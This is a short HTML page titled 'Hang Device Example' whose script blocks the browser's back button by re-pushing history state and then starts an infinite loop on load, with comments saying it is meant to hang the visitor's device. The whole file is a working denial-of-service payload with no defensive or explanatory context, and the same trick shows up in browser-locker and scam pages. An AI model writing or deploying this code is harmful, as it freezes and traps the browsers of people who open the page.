<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hang Device Example</title>
</head>
<body>
    <script>
        // Block the back button
        history.pushState(null, null, location.href);
        window.onpopstate = function() {
            history.pushState(null, null, location.href);
        };

        // Hang the device immediately upon loading
        window.onload = function() {
            while (true) {
                // Infinite loop to hang the device
            }
        };
    </script>
</body>
</html>
